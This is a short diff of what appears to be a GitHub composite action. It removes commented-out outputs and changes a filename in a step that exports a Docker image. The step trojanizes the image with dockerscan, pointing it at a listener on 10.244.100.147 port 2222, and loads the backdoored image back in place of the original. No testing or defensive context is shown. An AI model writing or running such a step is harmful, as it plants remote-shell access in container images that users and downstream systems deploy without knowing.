@@ -5,10 +5,6 @@ inputs:
     description: 'Local image name'
     required: true
     default: 'local'
-# outputs:
-#   random-number:
-#     description: "Random number"
-    # value: ${{ steps.random-number-generator.outputs.random-number }}
 runs:
   using: "composite"
   steps:
@@ -34,4 +30,4 @@ runs:
       run: |
         docker save ${{ inputs.image-name }} -o original
         dockerscan image modify trojanize original -l 10.244.100.147 -p 2222 -o trojan
-        docker load -i trojan
+        docker load -i trojan.tar
